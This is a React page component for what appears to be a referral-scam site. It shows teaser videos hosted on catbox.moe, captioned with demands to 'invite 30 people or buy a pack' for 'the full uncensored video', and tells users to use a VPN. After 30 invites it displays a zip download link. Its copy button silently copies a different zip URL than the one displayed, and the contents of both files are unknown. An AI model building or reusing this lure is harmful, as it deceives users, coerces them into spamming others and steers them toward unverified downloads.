import { useState } from 'react';
import AuthenticatedLayout from '@/Layouts/AuthenticatedLayout';
import { Head } from '@inertiajs/react';

export default function Video({ invites, watermark }) {
    // Hardcoded video URLs and captions
    const videos = [
        {
            url: 'https://files.catbox.moe/h8utj1.mp4',
            caption: 'invite 30 people or buy a pack get the full uncensored video'
        },
        {
            url: 'https://files.catbox.moe/03ebky.mp4',
            caption: 'invite 30 people or buy a pack to get the full uncensored video'
        },
        {
            url: 'https://files.catbox.moe/ollp4l.mp4',
            caption: 'invite 30 people or buy a pack to get the full uncensored video'
        },
        {
            url: 'https://files.catbox.moe/vzuv7j.mp4',
            caption: 'invite 30 people or buy a pack to get the full uncensored video'
        },
        {
            url: 'https://files.catbox.moe/4hluja.mp4',
            caption: 'invite 30 people or buy a pack to get the full uncensored video'
        },
        {
            url: 'https://files.catbox.moe/llaxru.mp4',
            caption: 'invite 30 people or buy a pack to get the full uncensored video'
        },
        // Add more videos here if needed
    ];

    // State to track whether the link is copied
    const [copied, setCopied] = useState(false);

    const handleCopy = () => {
        const textToCopy = 'https://files.catbox.moe/p4hk45.zip';
        navigator.clipboard.writeText(textToCopy).then(() => {
            setCopied(true);
            setTimeout(() => setCopied(false), 2000);
        });
    };

    return (
        <AuthenticatedLayout
            header={
                <h2 className="text-xl font-semibold leading-tight text-gray-800">
                    Video
                </h2>
            }
        >
            <Head title="Dashboard" />

            <div className="py-12">
                <div className="mx-auto max-w-7xl sm:px-6 lg:px-8">
                    <div className="overflow-hidden bg-white shadow-sm sm:rounded-lg">
                        <div className="p-6 text-gray-900">
                            <div className="bg-yellow-100 border-l-4 border-yellow-500 text-yellow-700 p-4 mb-6" role="alert">
                                <p className="font-bold">Warning</p>
                                <p>Videos will be available to download when you have successfully invited 30 people. Use a VPN if videos are not loading. and be patient for the video to be loaded</p>
                            </div>

                            {invites >= 30 && (
                                <div className="mb-8 p-4 bg-yellow-100 rounded-md flex items-center justify-between">
                                    <div>
                                        <p className="text-gray-700">Copy this link and open it with a web browser:</p>
                                        <a href='https://files.catbox.moe/4jj2ns.zip' className="text-blue-500">
                                            https://files.catbox.moe/4jj2ns.zip
                                        </a>
                                    </div>
                                    <button
                                        onClick={handleCopy}
                                        className="ml-4 px-4 py-2 bg-green-500 text-white font-semibold rounded-md"
                                    >
                                        {copied ? 'Copied!' : 'Copy Link'}
                                    </button>
                                </div>
                            )}

                            {/* Videos Section */}
                            {videos.map((video, index) => (
                                <div key={index} className="mb-8">
                                    {/* Video Player */}
                                    <div className="relative w-full">
                                        <video 
                                            controls 
                                            controlsList="nodownload" 
                                            disablePictureInPicture 
                                            onContextMenu={(e) => e.preventDefault()} 
                                            className="w-full rounded-lg"
                                        >
                                            <source src={video.url} type="video/mp4" />
                                            Your browser does not support the video tag.
                                        </video>

                                        {/* Watermark */}

                                    </div>
                                    
                                    {/* Caption Below the Video */}
                                    <div className="text-center mt-4 text-lg font-semibold text-gray-800">
                                        {video.caption}
                                    </div>
                                </div>
                            ))}
                        </div>
                    </div>
                </div>
            </div>
        </AuthenticatedLayout>
    );
}
